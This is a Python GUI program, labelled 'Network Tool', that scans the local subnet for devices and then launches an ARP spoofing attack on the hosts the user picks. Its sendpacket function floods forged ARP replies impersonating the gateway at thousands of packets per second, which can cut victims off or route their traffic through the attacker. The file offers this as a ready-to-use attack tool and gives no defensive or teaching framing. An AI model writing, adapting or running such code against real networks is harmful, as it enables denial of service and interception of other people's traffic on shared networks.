import sys
import requests
import threading
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QPushButton,
    QLabel,
    QVBoxLayout,
    QListWidget,
    QLineEdit,
    QMessageBox,
    QListWidgetItem,
    QAbstractItemView,
    QProgressDialog,
    QDesktopWidget,
    QHBoxLayout,
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPropertyAnimation, QSize
import socket
import ipaddress
import netifaces
from scapy.all import Ether, ARP, srp, sendp


class NetworkScanner(QThread):
    update_status = pyqtSignal(str)
    found_device = pyqtSignal(str, str, str)  # Signal to send IP, MAC, Manufacturer
    error_occurred = pyqtSignal(str)

    def run(self):
        try:
            self.update_status.emit("Scanning Network...")
            gateway_ip, _ = getGateWayIp_Mac()
            network = str(ipaddress.IPv4Network(gateway_ip + '/24', strict=False))
            query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

            # Send ARP requests and process responses
            for _, received in srp(query, timeout=2, verbose=0)[0]:
                ip = received.psrc
                mac = received.hwsrc
                manufacturer = get_manufacturer(mac)
                self.found_device.emit(ip, mac, manufacturer)

            self.update_status.emit("Scanning complete.")
        except Exception as e:
            self.error_occurred.emit(f"Failed to scan network: {str(e)}")


class NetworkToolGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.attack_threads = []
        self.stop_attack_event = threading.Event()
        self.animation = None  # 初始化动画对象

    def initUI(self):
        self.setWindowTitle("Network Tool")

        layout = QVBoxLayout()

        self.scan_button = QPushButton("Scan Network", self)
        self.scan_button.clicked.connect(self.scan_network)

        self.ip_list = QListWidget(self)
        self.ip_list.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.ip_list.itemSelectionChanged.connect(self.update_target_indices)

        self.label_indices = QLabel("Target indices:", self)
        self.input_indices = QLineEdit(self)
        self.input_indices.textChanged.connect(self.update_selection_from_indices)

        self.label_packets = QLabel("Packets per second:", self)
        self.input_packets = QLineEdit(self)
        self.input_packets.setText("8000")
        self.input_packets.textChanged.connect(self.check_packets_input)

        self.attack_button = QPushButton("Start ARP Attack", self)
        self.attack_button.setEnabled(False)  # Initially disabled
        self.attack_button.clicked.connect(self.start_arp_attack)

        layout.addWidget(self.scan_button)
        layout.addWidget(self.ip_list)

        indices_layout = QHBoxLayout()
        indices_layout.addWidget(self.label_indices)
        indices_layout.addWidget(self.input_indices)
        layout.addLayout(indices_layout)

        layout.addWidget(self.label_packets)
        layout.addWidget(self.input_packets)
        layout.addWidget(self.attack_button)

        self.setLayout(layout)

        # Adjust the initial window size
        self.resize(400, 300)
        self.adjust_window_size()

    def check_packets_input(self):
        """Enable attack button only if valid input is provided and there are targets selected."""
        text = self.input_packets.text()
        self.update_attack_button()

    def update_attack_button(self):
        """Update the state of the attack button."""
        text = self.input_packets.text()
        has_valid_packet_input = text.isdigit() and int(text) > 0
        has_targets_selected = len(self.input_indices.text().split()) > 0
        self.attack_button.setEnabled(has_valid_packet_input and has_targets_selected)

    def scan_network(self):
        self.scanning_dialog = QProgressDialog(self)
        self.scanning_dialog.setWindowTitle("Processing")
        self.scanning_dialog.setLabelText("Scanning Network...")
        self.scanning_dialog.setCancelButtonText("Cancel")
        self.scanning_dialog.setRange(0, 0)
        self.scanning_dialog.setWindowModality(Qt.ApplicationModal)
        self.scanning_dialog.setMinimumWidth(300)

        self.user_canceled = False
        self.scanning_dialog.canceled.connect(self.cancel_scan)
        self.scanning_dialog.show()

        # Start the network scanning in a separate thread
        self.network_scanner = NetworkScanner()
        self.network_scanner.update_status.connect(self.handle_update_status)
        self.network_scanner.found_device.connect(self.add_device_to_list)
        self.network_scanner.error_occurred.connect(self.on_scan_error)
        self.network_scanner.start()

    def handle_update_status(self, status):
        if status == "Scanning complete.":
            self.scanning_dialog.close()
        else:
            self.scanning_dialog.setLabelText(status)

    def cancel_scan(self):
        if self.network_scanner.isRunning():
            self.network_scanner.terminate()
            self.user_canceled = True
        self.scanning_dialog.close()

    def add_device_to_list(self, ip, mac, manufacturer):
        index = self.ip_list.count() + 1  # Add sequence number
        item_text = f"[{index}] {ip}\t{mac} ({manufacturer})"
        item = QListWidgetItem(item_text)
        self.ip_list.addItem(item)
        self.adjust_window_size()

    def on_scan_error(self, message):
        self.scanning_dialog.close()
        QMessageBox.critical(self, "Error", message)

    def update_target_indices(self):
        """Update the target indices input field based on selected list items, sorted in numerical order."""
        selected_indices = sorted(
            int(item.text().split(']')[0][1:]) for item in self.ip_list.selectedItems()
        )
        self.input_indices.blockSignals(True)  # Prevent recursion
        self.input_indices.setText(' '.join(map(str, selected_indices)))
        self.input_indices.blockSignals(False)
        self.update_attack_button()

    def update_selection_from_indices(self):
        """Update the list selection based on the target indices input field, ensuring sorted order."""
        try:
            indices = sorted(int(i) - 1 for i in self.input_indices.text().split() if i.isdigit())
            self.ip_list.blockSignals(True)  # Prevent recursion
            self.ip_list.clearSelection()
            for index in indices:
                if 0 <= index < self.ip_list.count():
                    self.ip_list.item(index).setSelected(True)
            self.ip_list.blockSignals(False)
            self.update_attack_button()
        except ValueError:
            pass  # Ignore invalid input

    def start_arp_attack(self):
        selected_items = self.ip_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Targets Selected", "Please select at least one target to attack.")
            return

        packets_per_sec = int(self.input_packets.text())

        # Ensure we are using a fresh scan list
        hosts = [(item.text().split()[1], item.text().split()[2]) for item in self.ip_list.findItems('*', Qt.MatchWildcard)]
        selected_targets = []
        for item in selected_items:
            try:
                index = self.ip_list.row(item)
                ip, mac = hosts[index]
                selected_targets.append((ip, mac.split(" ")[0]))
            except IndexError:
                QMessageBox.warning(self, "Error", "Selected index out of range.")

        my_ip, my_mac = getMyIp_Mac()
        gateway_ip, _ = getGateWayIp_Mac()

        # Use a dialog to indicate the attack is ongoing
        self.attack_dialog = QProgressDialog(self)
        self.attack_dialog.setWindowTitle("ARP Attack Running")
        self.attack_dialog.setLabelText("Sending ARP packets...")
        self.attack_dialog.setCancelButtonText("Stop Attack")
        self.attack_dialog.setRange(0, 0)
        self.attack_dialog.setWindowModality(Qt.ApplicationModal)
        self.attack_dialog.setMinimumWidth(300)

        self.attack_dialog.canceled.connect(self.cancel_attack)
        self.attack_dialog.show()

        # Reset stop event and start the attack in separate threads
        self.stop_attack_event.clear()
        self.attack_threads = [
            threading.Thread(target=self.run_attack, args=(my_mac, gateway_ip, target, packets_per_sec))
            for target in selected_targets
        ]

        for thread in self.attack_threads:
            thread.start()

    def run_attack(self, my_mac, gateway_ip, target, pkt_per_sec):
        try:
            target_ip, target_mac = target
            sendpacket(my_mac, gateway_ip, target_ip, target_mac, pkt_per_sec, self.stop_attack_event)
        except Exception as e:
            self.on_attack_error(str(e))

    def cancel_attack(self):
        self.stop_attack_event.set()  # Signal all threads to stop
        for thread in self.attack_threads:
            if thread.is_alive():
                thread.join()  # Wait for thread to stop
        self.attack_dialog.close()

    def closeEvent(self, event):
        """Ensure all threads are terminated when the window is closed."""
        self.cancel_attack()
        event.accept()

    def adjust_window_size(self):
        # 获取屏幕尺寸
        screen = QDesktopWidget().screenGeometry()
        screen_width = screen.width()
        screen_height = screen.height()

        if self.ip_list.count() > 0:
            # 计算列表项的最大宽度
            max_width = max(
                self.fontMetrics().horizontalAdvance(item.text()) 
                for item in self.ip_list.findItems('*', Qt.MatchWildcard)
            )
            
            # 计算列表项的总高度
            item_height = self.ip_list.sizeHintForRow(0)
            total_content_height = item_height * self.ip_list.count() + 60  # 加上额外空间

            # 获取当前列表框的可视区域高度
            visible_area_height = self.ip_list.viewport().height()

            # 如果内容高度大于可视区域高度，说明需要增加窗口高度
            if total_content_height > visible_area_height:
                # 计算需要增加的高度
                height_increase = total_content_height - visible_area_height
                new_height = self.height() + height_increase
                new_height = min(new_height, screen_height)
            else:
                new_height = self.height()

            # 获取滚动条宽度和填充
            scrollbar_width = self.style().pixelMetric(QApplication.style().PM_ScrollBarExtent)
            padding = 30

            # 计算窗口的新宽度
            new_width = min(max_width + scrollbar_width + padding, screen_width)

            # 使用 QPropertyAnimation 进行窗口大小的平滑动画
            self.animate_resize(new_width, new_height)

    def animate_resize(self, target_width, target_height):
        # 创建动画对象
        self.animation = QPropertyAnimation(self, b"size")
        self.animation.setDuration(200)  # 设置动画持续时间，单位为毫秒
        self.animation.setStartValue(self.size())
        self.animation.setEndValue(QSize(target_width, target_height))
        self.animation.start()


def get_manufacturer(mac_address):
    mac_address = mac_address.replace(":", "").replace("-", "").upper()
    url = f"https://api.macvendors.com/{mac_address}"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except requests.RequestException:
        return "Unknown"


def sendpacket(my_mac, gateway_ip, target_ip, target_mac, count, stop_event):
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    arp.op = 2

    packet = ether / arp
    while not stop_event.is_set():  # Check the event to see if we should stop
        sendp(packet, count=count, inter=1.0/count, verbose=False)


def getMyIp_Mac():
    myhostname = socket.gethostname()
    myip = socket.gethostbyname(myhostname)
    return myip, getHostMac(myip)


def getGateWayIp_Mac():
    gateIp = netifaces.gateways()['default'][netifaces.AF_INET][0]
    getGateMac = getHostMac(gateIp)
    return gateIp, getGateMac


def getHostMac(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return False


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = NetworkToolGUI()
    window.show()
    sys.exit(app.exec_())
